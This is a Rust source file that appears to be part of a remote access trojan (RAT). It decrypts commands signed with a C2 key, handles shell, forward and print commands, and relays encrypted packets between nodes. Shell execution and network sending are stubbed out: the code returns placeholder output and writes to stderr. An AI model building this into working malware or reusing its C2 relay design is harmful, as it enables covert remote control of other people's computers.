use crate::{ser_encrypt, unpack_commands, Command, Error};

extern crate sodiumoxide;
use sodiumoxide::crypto::box_ as crypto;

extern crate bincode;

pub fn commands<FSend>(
    cmds: Vec<Command>,
    rat_skey: &crypto::SecretKey,
    full_bytes: &[u8],
    mut send_message: FSend,
) -> crate::Result<()>
where
    FSend: FnMut(String, &[u8]) -> Result<(), String>,
{
    let mut addons = vec![];
    let mut nexts = vec![];
    for cmd in cmds.into_iter() {
        println!("Got command: {:?}", cmd);
        match cmd {
            Command::Shell(line, recver_pkey) => {
                let res = format!("<output of `{}`>", line).into_bytes();
                let encd = ser_encrypt(
                    &Command::ShellOutput(res),
                    rat_skey,
                    &recver_pkey,
                )?;
                addons.push(encd);
            }
            Command::ShellOutput(out) => {
                println!("Output: {}", std::str::from_utf8(&out).unwrap());
            }

            Command::Forward(to) => nexts.push(to),

            Command::Print(what) => println!("{}", what),
        }
    }
    if !nexts.is_empty() {
        let mut last_vec: Vec<Vec<u8>> =
            bincode::deserialize(full_bytes).map_err(Error::BincodeFail)?;
        last_vec.append(&mut addons);
        let new_packet =
            bincode::serialize(&last_vec).map_err(Error::BincodeFail)?;
        for next in nexts {
            send_message(next, &new_packet).map_err(Error::SendFailed)?;
        }
    }
    Ok(())
}

pub fn packet<FSend>(
    c2_pkey: &crypto::PublicKey,
    rat_skey: &crypto::SecretKey,
    bytes: &[u8],
    send_message: FSend,
) -> crate::Result<()>
where
    FSend: FnMut(String, &[u8]) -> Result<(), String>,
{
    let unpacked = unpack_commands(c2_pkey, rat_skey, bytes)?;
    commands(unpacked, rat_skey, bytes, send_message)
}

pub fn send(dest: String, data: &[u8]) -> Result<(), String> {
    use std::io::Write as _;
    println!("Send {}-byte payload to {}", data.len(), dest);
    match std::io::stderr().write_all(&data) {
        Ok(_) => Ok(()),
        Err(e) => Err(format!("{:?}", e)),
    }
}
